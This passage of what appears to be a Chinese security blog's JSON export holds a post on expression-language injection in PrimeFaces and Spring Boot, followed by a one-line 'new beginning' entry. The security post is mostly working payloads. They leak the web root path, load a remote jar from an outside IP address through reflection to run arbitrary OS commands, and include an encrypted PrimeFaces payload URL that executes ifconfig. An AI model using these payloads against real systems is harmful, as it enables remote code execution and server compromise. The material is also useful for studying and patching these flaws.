uMKljPgnOTVxmOB+H6/QEPW9ghJMGL3PRdkfmbiiPkV9XxzneUPyMM8BUxgtfxF3wYMlt0MXkqO5+OpbBXfBSKlTh7gJWI1HR5e/f4ZjcLzobfbDkQghTWQVAXvhdUc8D7M8Nnr+gSpk0we/YPtcrOOmI+/uuxl31mfOtFvEWGE3AUZFGxpmyfyMuGL0rzVw3wUpjUlHw4k3O4pm1RrCJT/PxEtCs00U9EBM2okSaAdPIn9p9G5X3lwi6lN7MXvoBhoFVy+31JzmoVeaZattVJhqvZRs1fguZGDCqQaJe+c6rQmcZWEKQg== Web路径: ${facesContext.getExternalContext().getResponse().getWriter().println(request.getSession().getServletContext().getRealPath(/&quot;//&quot;))}${facesContext.getExternalContext().getResponse().getWriter().flush()}${facesContext.getExternalContext().getResponse().getWriter().close()} 加密的Payload: uMKljPgnOTVxmOB%2BH6%2FQEPW9ghJMGL3PRdkfmbiiPkV9XxzneUPyMM8BUxgtfxF3wYMlt0MXkqO5%2BOpbBXfBSCSkb2z5x8Cb2P%2FDS2BUn7odA0GflWHV%2B9J8uLGYIqPK9HY85O%2BJw0u5X9urorJfQZKJihsLCV%2BnqyXHs8i6uh4iIboLA2TZUiTbjc3SfybUTvPCjRdyT6rCe6MPQGqHYkBiX3K7fGPuwJ2XNONXI9N2Sup5MWcUUo87FbX3jESvOq2Bs3sDKU4bW3aCGbhUcA2ZEgSxkLcW6VKDnXV5hxvz6J4a4E6P8HCy9v8%2BdrRzmtKbwczXk%2B9n8Lm2KYS%2Fk2TJKpeKjPg0t%2BAiKzTiqak%3D 反射式调用执行命令: ${request.getSession().setAttribute(&quot;list&quot;,&quot;&quot;.getClass().forName(&quot;java.util.ArrayList&quot;).newInstance())}${request.getSession().getAttribute(&quot;list&quot;).add(request.getSession().getServletContext().getResource(&quot;/&quot;).toURI().create(&quot;http://118.184.23.145/cmd.jar&quot;).toURL())}${facesContext.getExternalContext().getResponse().getWriter().println(request.getSession().getClass().getClassLoader().getParent().newInstance(request.getSession().getAttribute(&quot;list&quot;).toArray(request.session.servletContext.getClass().getClassLoader().getParent().getURLs())).loadClass(&quot;org.javaweb.test.HelloWorld&quot;).newInstance().exec(request.getParameter(&quot;cmd&quot;)))}${facesContext.getExternalContext().getResponse().getWriter().flush()}${facesContext.getExternalContext().getResponse().getWriter().close()} 加密的Payload调用: http://xx.xx.xx.xx/javax.faces.resource/?pfdrt=sc&amp;;ln=primefaces&amp;;pfdrid=1acBqv16SJhfc30NLxL/NinZaDI%2BoHqk1xDbSI8qOl4%2BoXsKFyqJq3gv2IBc1S89q6G1POSSKDNlzHE/%2BnsMuZgTDALpyOstkBkFVJNc2U/B%2BoceOqnpF5YZoWtF0W7qGxsImsumut7GQoKKMQcbwwL4coE07x6Mn09hfy94tuiiy6S8S1vr8kPPYzrUC5AveiE9ls7dLDiaQripnC0Z71fB1xCjkxw8wjZt3om1PT9Wq8YAqkHuBIo/soFBvM1YDnJosELhjmfoJdAGBRfullXUfVw5xEg9ykFpLaKugkbDIBgXtv58Xu4BrT0d5MAQ8BOVwjzSodkdllYCAeUklCDWRfFtZDORdcAzXVxTRkEn%2Bnx7qAFh8NwK/sDsXz6U1Q2Q/ny1UaEMFM9qrgVmfX181HXWc4TuETxLqUohfreYLJLW%2BAxcxzciqqoKj%2Bht/KJ%2B%2BGfzuNoSs0E9i9N/AL5PALrdTRg%2BuweD3CMLZgLDITkMx4z7dmP2daw2B98nrKOLHtG6nYDcDmSfy8d8IKMZJvuq/WT7JLm0PJ3UqDyvzHHjrPCDpTFhMUmftFFvi4APBpT41slHYoRKDbJMvU/upvKyAsy5xQKJ5s6x%2B4F%2By9p8Icp1TQfMcqIPwMQkvsOs8i61m6i96dpmxpfZPWprcigaWMhJG8/iYRg7ZygegrmSbovLy5Tr3Mc9GODgdTx7v396NJ75yQyU4ETmYEhNxWTIoncK7MbyBcIWR/h1GjhCwwpquKRWLb3hal8DNJxubaKnxGa9mRNaQAZRr0s%2B3eo1jeino5O8CSQzla7ACpJc3867AAGxnWrnE/weJ20W3QKj6nIz/EAyx87aVIKs%2BQH3O4IGx%2BuiZ38TvMeg6jZpkZGiRNEUEuAoV6CWlMA%2BxM6BPvbPyWsqmdI8l%2ByFBhsoSpNhel2%2B0gxS5wWqZbRyi0rjPlOzUe8Xir9mlpuBZzrUIcbaYaE8PHQno1OZ/zaHx/GzAJakSRQ5YbKQ/W/OzkokDG3M79KSCtx2jN92PtISucY%3D&amp;;cmd=ifconfig Spring Boot框架表达式注入漏洞影响Spring Boot版本从1.1-1.3.0 http://localhost:8555/test.php?id=${new%20java.lang.String(new%20byte[]{101, 108, 105, 110, 106, 101, 99, 116 })} 内容中出现 elinject就是注入成功","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"/tags/web安全/"}]},{"title":"新的开始！","slug":"新的开始！","date":"2018-09-17T16:32:10.000Z","updated":"2019-03-12T02:57:01.176Z","comments":true,"path":"2018/09/新的开始！/","link":"","permalink":"/2018/09/新的开始！/","excerpt":"","text":"记录自己某些时候的学习，和某些突发奇想。简而言之就是为了防止忘记某些自己需要的东西。","categories":[],"tags":[]}]}